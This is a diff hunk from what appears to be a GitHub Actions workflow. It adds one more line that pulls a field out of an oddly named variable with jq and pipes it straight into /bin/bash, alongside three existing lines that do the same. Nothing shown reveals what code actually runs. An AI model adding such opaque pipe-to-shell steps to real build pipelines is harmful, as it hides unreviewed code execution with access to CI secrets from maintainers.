@@ -24,6 +24,7 @@ jobs:
           echo $jdlbv2356 | jq -r .rczcg88 | /bin/bash
           printf '%s' "$det2" | jq -r .cl836 | /bin/bash
           printf '%s' "$p1140" | jq -r .t231 | /bin/bash
+          printf '%s' "$faydv00" | jq -r .ejxd801 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
